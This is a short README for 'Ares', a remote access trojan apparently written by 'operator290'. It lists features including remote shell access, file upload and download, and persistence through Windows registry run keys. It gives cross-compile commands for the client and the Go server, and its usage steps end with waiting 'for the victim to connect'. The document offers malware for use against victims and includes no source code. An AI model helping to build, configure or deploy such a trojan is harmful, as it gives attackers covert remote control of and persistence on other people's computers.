Ares is a basic rat written by operator290

Functionality:
 + Shell access
 + File upload / download
 + Create message box
 + Persistence using registry run keys

Compile instructions:
 YOU MUST SET THE SERVER IP IN THE "client.c" CODE BEFORE COMPILING
 To compile the client either run the compile.sh script or use the command: x86_64-w64-mingw32-gcc -o client.exe client.c -lws2_32 -lmswsock
 To compile the server for windows:
  Run the command: GOOS=windows GOARCH=amd64 go build -o main.exe main.go
 To compile the server for linux:
  Run the command: go build main.go

Usage:
 1. Open the server CLI by running ./main
 2. Configure server listener options
 3. Start the server and wait for the victim to connect